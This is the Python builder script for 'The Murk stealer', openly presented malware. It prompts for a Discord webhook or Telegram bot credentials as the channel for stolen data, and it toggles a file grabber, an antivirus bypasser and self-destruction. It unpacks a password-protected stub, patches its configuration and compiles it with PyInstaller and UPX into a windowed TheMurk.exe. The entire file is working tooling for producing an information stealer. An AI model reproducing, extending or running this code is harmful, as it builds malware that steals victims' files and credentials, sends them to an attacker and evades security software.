#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#




import shutil
import os 
import pyzipper




class Builder():
    def __init__(self) -> None:
        self.deps = ["cryptography","GPUtil","Pillow","psutil", "pyasn1", "pycryptodome", "pywin32", "pyzipper", "Requests", "WMI"]
        self.type = self.Menu()
        if self.type == "Discord" :
            self.Discord()
        if self.type == "Telegram" :
            self.Telegram()
        self.Options()

    def Menu(self):
        cmd = 'mode 80,30'
        os.system(cmd)
        self.logo = '''#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#'''
        print("\033[34m{}\033[0m".format(self.logo))
        print("\033[33m{}\033[0m".format("(i) Welcome to the Murk builder\n\n"))
        self.type = ""
        while self.type != "Discord" and self.type != "Telegram":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Discord/Telegram)"))
            self.type = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\n\n")
        return self.type

    def Discord(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) WebHook URL"))
        self.urlWebHook = input("\033[33m\033[1m{}\033[0m".format(">>> "))
    
    def Telegram(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) HTTP API"))
        self.HTTP = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) Telegram ID"))
        self.ID = input("\033[33m\033[1m{}\033[0m".format(">>> " ))

    def Options(self):

        self.fileGrab = ""
        while self.fileGrab != "Y" and self.fileGrab != "N" and self.fileGrab != "n" and self.fileGrab != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.fileGrab = input("\033[33m\033[1m{}\033[0m".format(">>> " ))

        self.oneStart = ""
        while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
            self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        
        self.startId = -1
        while self.startId < 0 and (self.oneStart == "Y" or self.oneStart == "y"):
            print("\033[36m\033[4m{}\033[0m".format("(?) unique id for oneStart, \"0\" for default(only numbers)"))
            try:
                self.startId = int(input("\033[33m\033[1m{}\033[0m".format(">>> ")))
            except:
                pass

        self.avBypass = ""
        while self.avBypass != "Y" and self.avBypass != "N" and self.avBypass != "n" and self.avBypass != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses bypasser [y/n]"))
            self.avBypass = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        
        self.destruct = ""
        while self.destruct != "Y" and self.destruct != "N" and self.destruct != "n" and self.destruct != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable self destruction [y/n]"))
            self.destruct = input("\033[33m\033[1m{}\033[0m".format(">>> "))

        self.debuging = ""
        while self.debuging != "Y" and self.debuging != "N" and self.debuging != "n" and self.debuging != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable debuging mode(write \"n\" if you don't know what it is) [y/n]"))
            self.debuging = input("\033[33m\033[1m{}\033[0m".format(">>> "))

        self.libs = ""
        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")

        if self.libs == "N" or self.libs == "n":
            for dep in self.deps:
                os.system(f'pip install {dep}')
            print("\033[33m{}\033[0m".format("(i) All libraries installed"))
            self.Build()
        else:
            self.Build()

    def Build(self):
        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
        with pyzipper.AESZipFile('stub.dll', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('The-Murk-stealer'))
        path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Temp'
        shutil.rmtree(path + os.sep + r'__{12222301}__cache__', ignore_errors=True)
        shutil.move(r'__{12222301}__cache__',path)
        path = path + os.sep + r'__{12222301}__cache__'
        
        print("\033[33m{}\033[0m".format("(i) Reading vars..."))
        with open(rf'{path}\\preferences\\config.py', 'r', encoding="utf-8") as f:
            data = f.read()
            f.close()

        print("\033[33m{}\033[0m".format("(i) Changing vars..."))

        if self.fileGrab == "Y" or self.fileGrab == "y":
            data = data.replace('enableFileGrabber = False', 'enableFileGrabber = True')

        if self.avBypass == "Y" or self.avBypass == "y":
            data = data.replace('avbypass = False', 'avbypass = True')
        
        if self.destruct == "Y" or self.destruct == "y":
            data = data.replace('selfDestruct = False','selfDestruct = True')

        if self.oneStart == "Y" or self.oneStart == "y":
            data = data.replace('oneStart = False', 'oneStart = True')
            if self.startId > 0:
                data = data.replace('id = 19380887093145377305', f'id = {str(self.startId)}')
        
        if self.debuging == "Y" or self.debuging == "y":
            data = data.replace('debuging = False', 'debuging = True')
        
        if self.type == "Discord" :
            data = data.replace("sendData = [0,\"\",\"\"]",f"sendData = [0,\"{self.urlWebHook}\",\"null\"]")
        if self.type == "Telegram" :
            data = data.replace("sendData = [0,\"\",\"\"]",f"sendData = [1,\"{self.HTTP}\",\"{self.ID}\"]")

        print("\033[33m{}\033[0m".format("(i) Writing vars..."))

        with open(rf'{path}\\preferences\\config.py', 'w', encoding="utf-8") as file:
            file.write(data)
            file.close()
        
        print("\033[33m{}\033[0m".format("(i) building..."))
        try:
            os.system(f"pyinstaller --noconfirm --onefile --windowed --icon \"{path}/preferences/icon.ico\" --name \"TheMurk\" --upx-dir \"{path}/upx-4.2.1-win64\" --version-file \"{path}/preferences/version.py\" --add-data \"{path}/manager;manager/\" --add-data \"{path}/preferences;preferences/\" --add-data \"{path}/targets;targets/\" --add-data \"{path}/progress.py;.\"  \"{path}/The_Murk.py\"")
        except:
            pass

        shutil.rmtree(path, ignore_errors=True)
        try:
            os.remove("/build")
            os.remove("TheMurk.spec")
        except:
            print("\033[31m{}\033[0m".format("(!) failed to remove cache"))
        try:
            os.rename("dist","built")
        except:
            print("\033[31m{}\033[0m".format("(!) failed to rename dist to built"))
        
        if os.path.exists("dist/TheMurk.exe") or os.path.exists("built/TheMurk.exe"):
            print("\033[33m{}\033[0m".format("(i) Done"))
            print("\033[33m{}\033[0m".format("(i) path to built file \"built\\TheMurk.exe\""))
        else:
            print("\033[31m{}\033[0m".format("(!) failed to built"))
        
        input("\033[33m{}\033[0m".format("(i) Exit on enter..."))

if __name__ == "__main__":
    Builder()